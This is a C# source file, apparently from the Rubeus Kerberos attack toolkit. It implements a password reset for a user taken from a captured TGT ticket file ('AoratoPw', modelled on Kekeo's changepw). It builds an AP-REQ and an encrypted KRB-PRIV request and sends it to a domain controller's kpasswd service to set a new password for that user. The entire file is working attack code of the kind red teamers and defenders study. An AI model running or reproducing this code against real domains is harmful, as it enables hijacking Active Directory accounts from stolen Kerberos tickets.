using System;
using Asn1;

namespace Rubeus
{
    public class Reset
    {
        public static void UserPassword(KRB_CRED kirbi, string newPassword, string domainController = "")
        {
            // implements the Kerberos-based password reset originally disclosed by Aorato
            //      This function is misc::changepw in Kekeo
            // Takes a valid TGT .kirbi and builds a MS Kpasswd password change sequence
            //      AP-REQ with randomized sub session key
            //      KRB-PRIV structure containing ChangePasswdData, enc w/ the sub session key
            // reference: Microsoft Windows 2000 Kerberos Change Password and Set Password Protocols (RFC3244)

            Console.WriteLine("[*] Action: Reset User Password (AoratoPw)\r\n");

            string dcIP = Networking.GetDCIP(domainController);
            if (String.IsNullOrEmpty(dcIP)) { return; }

            // extract the user and domain from the existing .kirbi ticket
            string userName = kirbi.EncryptedPart.ticket_info[0].pname.name_string[0];
            string userDomain = kirbi.EncryptedPart.ticket_info[0].prealm;

            Console.WriteLine("[*] Changing password for user: {0}@{1}", userName, userDomain);
            Console.WriteLine("[*] New password value: {0}", newPassword);

            // build the AP_REQ using the user ticket's keytype and key
            Console.WriteLine("[*] Building AP-REQ for the MS Kpassword request");
            AP_REQ ap_req = new AP_REQ(userDomain, userName, kirbi.Tickets[0], kirbi.EncryptedPart.ticket_info[0].key.keyvalue, (Interop.KERB_ETYPE)kirbi.EncryptedPart.ticket_info[0].key.keytype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR);

            // create a new session subkey for the Authenticator and match the encryption type of the user key
            Console.WriteLine("[*] Building Authenticator with encryption key type: {0}", (Interop.KERB_ETYPE)kirbi.EncryptedPart.ticket_info[0].key.keytype);
            ap_req.authenticator.subkey = new EncryptionKey();
            ap_req.authenticator.subkey.keytype = kirbi.EncryptedPart.ticket_info[0].key.keytype;

            // generate a random session subkey
            Random random = new Random();
            byte[] randKeyBytes;
            Interop.KERB_ETYPE randKeyEtype = (Interop.KERB_ETYPE)kirbi.EncryptedPart.ticket_info[0].key.keytype;
            switch (randKeyEtype) {
                case Interop.KERB_ETYPE.rc4_hmac:
                    randKeyBytes = new byte[16];
                    break;
                case Interop.KERB_ETYPE.aes256_cts_hmac_sha1:
                    randKeyBytes = new byte[32];
                    break;
                default:
                    Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                    return;
            }
            random.NextBytes(randKeyBytes);
            ap_req.authenticator.subkey.keyvalue = randKeyBytes;
            Console.WriteLine("[*] base64(session subkey): {0}", Convert.ToBase64String(randKeyBytes));

            // randKeyBytes is now the session key used for the KRB-PRIV structure
            // MIMIKATZ_NONCE ;)
            ap_req.authenticator.seq_number = 1818848256;

            // now build the KRV-PRIV structure
            Console.WriteLine("[*] Building the KRV-PRIV structure");
            KRB_PRIV changePriv = new KRB_PRIV(randKeyEtype, randKeyBytes);

            // the new password to set for the user
            changePriv.enc_part = new EncKrbPrivPart(newPassword, "lol");

            // now build the final MS Kpasswd request
            byte[] apReqBytes = ap_req.Encode().Encode();
            byte[] changePrivBytes = changePriv.Encode().Encode();
            byte[] packetBytes = new byte[10 + apReqBytes.Length + changePrivBytes.Length];
            short msgLength = (short)(packetBytes.Length - 4);
            byte[] msgLengthBytes = BitConverter.GetBytes(msgLength);
            System.Array.Reverse(msgLengthBytes);

            // Record Mark
            packetBytes[2] = msgLengthBytes[0];
            packetBytes[3] = msgLengthBytes[1];

            // Message Length
            packetBytes[4] = msgLengthBytes[0];
            packetBytes[5] = msgLengthBytes[1];

            // Version (Reply)
            packetBytes[6] = 0x0;
            packetBytes[7] = 0x1;

            // AP_REQ Length
            short apReqLen = (short)(apReqBytes.Length);
            byte[] apReqLenBytes = BitConverter.GetBytes(apReqLen);
            System.Array.Reverse(apReqLenBytes);
            packetBytes[8] = apReqLenBytes[0];
            packetBytes[9] = apReqLenBytes[1];

            // AP_REQ
            Array.Copy(apReqBytes, 0, packetBytes, 10, apReqBytes.Length);

            // KRV-PRIV
            Array.Copy(changePrivBytes, 0, packetBytes, apReqBytes.Length + 10, changePrivBytes.Length);

            // KPASSWD_DEFAULT_PORT = 464
            byte[] response = Networking.SendBytes(dcIP, 464, packetBytes, true);
            if (null == response) {
                return;
            }

            try {
                AsnElt responseAsn = AsnElt.Decode(response, false);
                // check the response value
                if (30 == responseAsn.TagValue) {
                    // parse the response to an KRB-ERROR
                    long errorCode = new KRB_ERROR(responseAsn.FirstElement).ErrorCode;
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", errorCode, (Interop.KERBEROS_ERROR)errorCode);
                    return;
                }
            }
            catch { }

            // otherwise parse the resulting KRB-PRIV from the server
            int responseIndex = 0;
            int respRecordMark = Helpers.ParseBigEndianInt32(response, ref responseIndex);
            int respMsgLen = Helpers.ParseBigEndianInt16(response, ref responseIndex);
            int respVersion = Helpers.ParseBigEndianInt16(response, ref responseIndex);
            int respAPReqLen = Helpers.ParseBigEndianInt16(response, ref responseIndex);

            int respKRBPrivLen = respMsgLen - respAPReqLen - 6;
            byte[] respKRBPriv = new byte[respKRBPrivLen];
            Array.Copy(response, responseIndex + respAPReqLen, respKRBPriv, 0, respKRBPrivLen);

            // decode the KRB-PRIV response
            foreach(AsnElt elem in AsnElt.Decode(respKRBPriv, false).FirstElement.EnumerateElements()) {
                if (3 != elem.TagValue) {
                    continue;
                }
                byte[] encBytes = elem.FirstElement.SecondElement.GetOctetString();
                byte[] decBytes = Crypto.KerberosDecrypt(randKeyEtype, Interop.KRB_KEY_USAGE_KRB_PRIV_ENCRYPTED_PART, randKeyBytes, encBytes);
                AsnElt decBytesAsn = AsnElt.Decode(decBytes, false);

                byte[] responseCodeBytes = decBytesAsn.FirstElement.FirstElement.FirstElement.GetOctetString();
                Array.Reverse(responseCodeBytes);
                short responseCode = BitConverter.ToInt16(responseCodeBytes, 0);
                if (0 == responseCode) {
                    Console.WriteLine("[+] Password change success!");
                }
                else {
                    Console.WriteLine("[X] Password change error: {0}", (Interop.KADMIN_PASSWD_ERR)responseCode);
                }
            }
        }
    }
}